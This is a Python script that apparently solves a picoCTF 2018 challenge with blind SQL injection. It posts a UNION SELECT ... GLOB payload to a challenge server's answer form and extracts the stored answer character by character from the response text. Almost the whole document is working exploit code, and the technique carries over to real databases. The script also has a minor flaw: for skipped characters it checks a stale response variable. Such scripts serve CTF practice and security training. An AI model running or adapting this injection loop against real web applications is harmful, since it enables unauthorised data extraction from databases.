import requests
import re

def brute():
	final = ''
	while True:
		for i in range(0x20, 0x7f):
			if i != 42 and i != 63: # '*:42' and '?:63' '%:37'
				params = {
					'answer': "' UNION SELECT * FROM answers WHERE answer GLOB '{}{}*'; --".format(final, chr(i))
				}
				r = requests.post('http://2018shell1.picoctf.com:2644/answer2.php', data=params)
				res = r.text

			if 'Wrong' in res:
				print(final,chr(i),"Wrong")

    
			if 'You are so close.' in res:
				final += chr(i)
				print (final,"Correct")
				break
			elif i == 0x7e:
				return final 

ans = brute()
print("Answer",ans)
